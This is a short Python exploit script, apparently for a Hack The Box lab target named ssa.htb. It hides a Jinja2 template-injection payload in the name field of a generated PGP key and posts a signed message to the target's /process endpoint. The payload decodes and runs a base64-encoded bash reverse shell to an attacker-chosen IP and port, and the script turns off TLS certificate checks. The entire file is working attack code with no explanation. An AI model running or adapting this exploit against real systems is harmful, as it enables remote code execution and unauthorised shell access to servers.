import os
import requests
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = "https://ssa.htb/process"

repeat = 'y'
while repeat.lower() == 'y':
    ip_addr = input("IP : ")
    port_number = input("Port : ")
    exploit = f"bash -i >& /dev/tcp/{ip_addr}/{port_number} 0>&1"
    exploit = base64.b64encode(bytes(exploit,'utf-8'))
    exploit = f"{{request.application.__globals__.__builtins__.__import__('os').popen('echo -n {exploit} | base64 -d | bash 2>/dev/null').read()}}"
    keygen_command = f'python3 keygen.py -p "whoami123" -n "{exploit}" -e "atlas@ssa.htb"'
    sign_command = 'python3 sign.py -c keypgp_uwu.pub.asc -k keypgp_uwu.key.asc -p "whoami123" -m "iess"'

    os.system(keygen_command)
    os.system(sign_command)
    with open("keypgp_uwu.pub.asc", "r") as file:
        public_key = file.read()

    signed_key_output = os.popen(sign_command)
    signed_key = signed_key_output.read().strip()

    data = {
        'signed_text': signed_key,
        'public_key': public_key
    }

    response = requests.post(url, data=data, verify=False)
    print(response.text)

    repeat = input("Run the program again? (y/n): ")
